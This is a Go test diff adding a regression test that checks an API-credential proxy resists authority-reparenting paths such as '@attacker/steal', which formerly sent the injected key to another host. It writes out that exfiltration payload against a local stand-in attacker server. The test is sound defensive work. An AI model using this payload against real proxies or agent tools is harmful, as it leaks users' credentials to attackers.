@@ -816,3 +816,44 @@ func TestAuthValueScrubStillFiresWithQueryAuth(t *testing.T) {
 		t.Errorf("expected [REDACTED] marker; got %q", body)
 	}
 }
+
+// TestExecuteNoCredentialExfilViaPathAuthority proves an agent-supplied path
+// cannot reparent the upstream authority to steal the credential. With the old
+// `targetURL + path` concat, path "@attacker/steal" produced
+// "http://target@attacker/steal" (Host=attacker) and the injected auth header
+// was sent there. httpguard allows both (loopback), so only the URL-parse +
+// host assertion in Execute stops the exfil.
+func TestExecuteNoCredentialExfilViaPathAuthority(t *testing.T) {
+	var attackerHit bool
+	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		attackerHit = true
+		t.Errorf("attacker origin MUST NOT be contacted (path=%s x-api-key=%q)", r.URL.Path, r.Header.Get("x-api-key"))
+	}))
+	defer attacker.Close()
+
+	var targetGotKey string
+	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		targetGotKey = r.Header.Get("x-api-key")
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer target.Close()
+
+	pc := makeProxy(t, target, "x-api-key", "sk-secret")
+	attackerHost := strings.TrimPrefix(attacker.URL, "http://") // 127.0.0.1:PORT
+
+	// The classic authority-reparenting payload.
+	_, err := pc.Execute(context.Background(), "proxy_request", map[string]any{
+		"method": "GET",
+		"path":   "@" + attackerHost + "/steal",
+	})
+	_ = err // either a host-mismatch refusal or a benign request to the real target
+
+	if attackerHit {
+		t.Fatal("credential exfiltrated: attacker origin was contacted")
+	}
+	// If anything reached an upstream, it must have been the real target with the
+	// credential — never the attacker.
+	if targetGotKey != "" && targetGotKey != "sk-secret" {
+		t.Errorf("unexpected key at target: %q", targetGotKey)
+	}
+}
